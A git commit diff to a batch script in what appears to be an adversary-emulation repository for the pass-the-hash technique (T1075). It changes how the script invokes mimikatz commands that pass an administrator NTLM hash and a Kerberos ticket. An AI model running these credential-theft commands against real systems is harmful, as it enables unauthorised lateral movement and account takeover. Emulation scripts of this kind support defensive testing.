445a99af6a2de3166b8b2755a73b013619a1b476
rajrakeshdr <raj.rakeshdr@gmail.com>
2023-11-14 13:29:09 +0530

    Update T1075.bat

--- Payloads/T1075/T1075.bat
+++ Payloads/T1075/T1075.bat
@@ -8,7 +8,7 @@ ECHO Technique: Pass-the-Hash using minikatz	(T1075)
 ECHO.
 ECHO [+] PTH using 'MIMIKATZ' 
 ECHO -------------------------------------------------------------------
-mimikatz # sekurlsa::pth /user:administrator /ntlm:cc36cf7a8514893efccd3324464tkg1a
-mimikatz # kerberos::ptt administrator@aria.com
+%utilities%mimikatz # sekurlsa::pth /user:administrator /ntlm:cc36cf7a8514893efccd3324464tkg1a
+%utilities%mimikatz # kerberos::ptt administrator@aria.com
 ECHO.
 
